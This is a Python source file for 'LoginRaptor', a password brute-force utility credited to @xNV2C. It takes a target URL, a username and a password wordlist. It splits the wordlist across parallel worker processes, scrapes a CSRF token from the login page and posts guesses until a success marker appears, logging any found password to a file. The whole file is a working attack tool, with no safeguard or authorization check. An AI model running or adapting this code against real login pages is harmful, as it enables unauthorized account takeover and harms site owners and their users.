import requests
import re
import time
import sys
import argparse
from concurrent.futures import ProcessPoolExecutor, as_completed

# ASCII Art Banner
LOGINRAPTOR_ASCII = r"""
    __    ____  ___________   __   ____  ___    ____  __________  ____ 
   / /   / __ \/ ____/  _/ | / /  / __ \/   |  / __ \/_  __/ __ \/ __ \
  / /   / / / / / __ / //  |/ /  / /_/ / /| | / /_/ / / / / / / / /_/ /
 / /___/ /_/ / /_/ // // /|  /  / _, _/ ___ |/ ____/ / / / /_/ / _, _/ 
/_____/\____/\____/___/_/ |_/  /_/ |_/_/  |_/_/     /_/  \____/_/ |_|  
                                                                       by: @xNV2C
"""

print(LOGINRAPTOR_ASCII)

# Graphics
class color:
    PURPLE = "\033[95m"
    CYAN = "\033[96m"
    DARKCYAN = "\033[36m"
    BLUE = "\033[94m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"
    END = "\033[0m"
    WHITE = "\33[37m"


# Variables
ims = time.time_ns() // 1_000_000
csrf_token = ""
tried = 0

# Argument parsing with argparse
parser = argparse.ArgumentParser(description="LoginRaptor brute force login utility")
parser.add_argument("-l", dest="username", help="Username")
parser.add_argument("-P", dest="password", help="Password wordlist")
parser.add_argument("-w", dest="URL", help="Target URL")
parser.add_argument("-v", dest="isValid", help="A post-login screen element")
parser.add_argument("-r", dest="rate", default="10", help="Tries per second")
parser.add_argument("--csrf-field", dest="csrf_field", default="csrf_token", help="CSRF field name")
parser.add_argument("--csrf-regex", dest="csrf_regex", default='name="csrf_token" value="(.*?)"', help="Regex to extract CSRF token")
parser.add_argument("--user-field", dest="user_field", default="username", help="Username field name")
parser.add_argument("--pass-field", dest="pass_field", default="password", help="Password field name")
parser.add_argument("--login-field", dest="login_field", default="login", help="Login button field name")
parser.add_argument("--login-value", dest="login_value", default="Login", help="Login button value")
parser.add_argument("--login-path", dest="login_path", default="/login", help="Login POST path")
parser.add_argument("--success-file", dest="success_file", default="success.txt", help="File to write successful password")
parser.add_argument("--tried-file", dest="tried_file", default="tried.txt", help="File to write tried passwords")
cmds = parser.parse_args()

# Interactive prompt for missing required arguments
def prompt_if_missing(val, prompt_text):
    if val is None or val == "":
        return input(prompt_text)
    return val

URL = prompt_if_missing(cmds.URL, "Target URL: ")
uname = prompt_if_missing(cmds.username, "Username: ")
pword = prompt_if_missing(cmds.password, "Password wordlist file: ")
eValid = prompt_if_missing(cmds.isValid, "Post-login screen element (success marker): ")
rate = cmds.rate
csrf_field = cmds.csrf_field
csrf_regex = cmds.csrf_regex
user_field = cmds.user_field
pass_field = cmds.pass_field
login_field = cmds.login_field
login_value = cmds.login_value
login_path = cmds.login_path
success_file = cmds.success_file
tried_file = cmds.tried_file

# Wordlists
with open(pword, "r") as file:
    mainCnt = file.readlines()
l = len(mainCnt)
n = max(1, int(l / int(rate)))
newCnt = [mainCnt[i : i + n] for i in range(0, len(mainCnt), n)]

# Ask user if CSRF token should be used
use_csrf = input("Do you want to use CSRF token? (y/n): ").strip().lower() == "y"

def bruteforce(url: str, content: list[str], uname, eValid, use_csrf, csrf_regex, csrf_field, user_field, pass_field, login_field, login_value, login_path, success_file, tried_file):
    session = requests.session()
    found = False
    with open(success_file, "a") as valPassFile, open(tried_file, "a") as tPass:
        passwords = [x.strip() for x in content]
        for password in passwords:
            try:
                login = session.get(url)
                csrf_token = ""
                if use_csrf:
                    reStr = re.search(csrf_regex, login.text)
                    if reStr:
                        csrf_token = str(reStr.group(1))
                postData = {
                    user_field: uname,
                    pass_field: password,
                    login_field: login_value,
                }
                if use_csrf:
                    postData[csrf_field] = csrf_token
                validation = session.post(f"{url}{login_path}", data=postData)
                if eValid in validation.text:
                    print(f"{color.GREEN}[^] Password has been found: {color.WHITE + password}")
                    valPassFile.write(password + "\n")
                    found = True
                    return True  # Found password, signal to stop others
                elif "Internal Server Error" in validation.text:
                    print(f"{color.YELLOW}[!] Internal Server Error for: {color.WHITE}{password}")
                    continue  # Skip and try next
                else:
                    print(f"{color.CYAN}[X] Tried: {color.WHITE}{password}")
                    tPass.write(password + "\n")
            except KeyboardInterrupt:
                sys.exit()
            except Exception as e:
                print(f"{color.RED}[!] Error: {e}{color.END}")
    return False

if __name__ == "__main__":
    try:
        with ProcessPoolExecutor(max_workers=int(rate)) as executor:
            futures = []
            for lst in newCnt:
                futures.append(
                    executor.submit(
                        bruteforce,
                        URL,
                        lst,
                        uname,
                        eValid,
                        use_csrf,
                        csrf_regex,
                        csrf_field,
                        user_field,
                        pass_field,
                        login_field,
                        login_value,
                        login_path,
                        success_file,
                        tried_file,
                    )
                )
            for future in as_completed(futures):
                if future.result():
                    print(f"{color.GREEN}[!] Stopping all processes, password found.{color.END}")
                    executor.shutdown(wait=False, cancel_futures=True)
                    sys.exit()
    except KeyboardInterrupt:
        print(f"{color.RED}[!] Interrupted by user.{color.END}")
        sys.exit()